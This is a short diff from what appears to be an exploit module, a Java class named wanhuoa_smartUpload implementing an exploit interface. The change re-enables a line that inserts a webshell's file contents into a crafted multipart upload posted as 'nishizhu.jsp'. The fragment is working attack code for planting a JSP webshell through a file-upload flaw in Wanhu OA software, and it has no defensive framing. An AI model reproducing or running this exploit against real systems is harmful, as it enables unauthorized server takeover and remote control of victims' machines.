@@ -80,7 +80,7 @@ public class wanhuoa_smartUpload implements Exploitlnterface {
                 "Content-Disposition: form-data; name=\"photo\"; filename=\"nishizhu.jsp\"\r\n" +
                 "Content-Type: text/plain\r\n" +
                 "\r\n" +
-//                shell.readFile(shell.Gsljsppath)  + "\r\n" +
+                shell.readFile(shell.Gsljsppath)  + "\r\n" +
                 "------WebKitFormBoundaryDUKz5M3eZoU6nAcO\r\n" +
                 "Content-Disposition: form-data; name=\"continueUpload\"\r\n" +
                 "\r\n" +
